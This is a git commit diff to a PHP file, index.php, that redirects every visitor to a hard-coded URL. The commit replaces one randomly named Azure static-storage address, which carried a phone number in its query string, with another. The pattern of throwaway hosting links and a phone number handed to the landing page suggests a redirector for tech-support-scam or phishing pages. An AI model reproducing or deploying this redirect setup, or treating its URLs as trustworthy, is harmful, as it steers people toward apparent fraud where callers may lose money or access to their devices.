86041d20195c984c0a05966d27777c40ca653393
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-10-01 21:34:47 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,6 +1,6 @@
 <?php
 // Define the destination URL
-$destination_url = "https://look8out6vwcor8bsxwe.z8.web.core.windows.net/index.html?Aniph=1-856-236-4220";
+$destination_url = "https://maxxx7gwcore7gxwfx9g73u.z1.web.core.windows.net/";
 
 // Send the Location header for redirection
 header("Location: " . $destination_url);
